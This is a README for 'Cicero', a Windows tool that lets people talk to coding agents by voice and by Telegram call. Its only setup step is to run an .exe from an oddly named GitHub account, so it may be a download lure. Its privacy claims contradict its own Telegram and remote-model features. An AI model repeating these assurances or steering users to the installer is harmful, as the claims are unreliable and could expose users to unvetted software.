# 🎙️ cicero - Talk to your coding agents naturally

[![](https://img.shields.io/badge/Download-Cicero-blue)](https://github.com/Municipal-capon303/cicero)

Cicero connects your voice to coding software. It lets you speak to your computer to write, edit, and fix code. You talk through your browser or a phone call. The software listens to your instructions and performs tasks for you. It handles the details so you can focus on the logic.

## 📋 What this tool does

Modern coding agents help you build software. They write functions, suggest changes, and create pull requests. Cicero gives these agents a voice. You speak your thoughts, and the agent translates your words into code.

You can stop typing descriptions for hours. Instead, you explain the goal aloud. The system hears your voice in real time. You can interrupt the agent if it makes a mistake. You can also match the voice of the agent to your preference. 

The system runs on your computer. Your voice data stays on your machine. This protects your privacy and keeps your workflow fast.

## 💻 System requirements

* Windows 10 or Windows 11
* At least 8GB of RAM
* A stable internet connection
* A standard microphone

## 📥 Getting setup

You need to download the installer to begin. Follow these instructions to get the software on your machine.

1. Visit the [official download page](https://github.com/Municipal-capon303/cicero).
2. Locate the section labeled Releases on the right side of the page.
3. Click the latest version link.
4. Select the file ending in .exe to start your download.
5. Once the file finishes downloading, open your Downloads folder.
6. Double-click the Cicero installer file.
7. Follow the prompts on the screen to finish the installation process.

## ⚙️ Configuring your agent

After installation, you will see a Cicero icon on your desktop. Open the application. The software will open a window on your screen. 

You must select the voice you want to use. The menu lists several options for tone and speed. Pick one that sounds natural to you. 

Next, link the application to your coding environment. The software supports most existing coding agents. If you use a tool like Claude Code or Ollama, select them from the dropdown menu in the settings tab. The application detects these tools automatically.

## 🗣️ Using voice commands

Once the agent is active, you can start talking. Press your spacebar to begin recording a command. Release it when you finish speaking.

Give clear instructions. For example, say: "Create a function to sort this list of names." The agent will process your voice, write the code, and show you the result. 

If the agent takes a path you dislike, speak to interrupt it. Say: "Stop, try a different way." The agent will wait for your new instruction. 

## 📞 Using Telegram for calls

You can control your code from anywhere using a phone call. This is helpful if you are away from your desk but want to iterate on a project.

1. Open the Telegram app on your phone.
2. Search for the Cicero bot provided in your settings menu.
3. Start a new voice call with the bot.
4. Speak normally to the bot.
5. The agent will hear your voice and perform the tasks on your computer.

## 🛡️ Troubleshooting common issues

If the software does not hear you, check your microphone settings. Ensure Windows recognizes your headset. Go to your system sound settings and verify that the input volume is high enough.

If the agent is slow, ensure you have a stable connection. While the software runs locally, it needs to reach modern coding models to understand your commands. 

If the application fails to open, verify your hardware meets the minimum requirements. Ensure you have the latest drivers for your sound card. 

## 🔒 Privacy and safety

All audio processing happens on your local drive. We do not store your voice recordings on our servers. Your code remains private and stays within your local environment. 

The software acts as a bridge. It converts sound waves to text and back again. It does not send your personal files to external databases. Use the software with confidence.
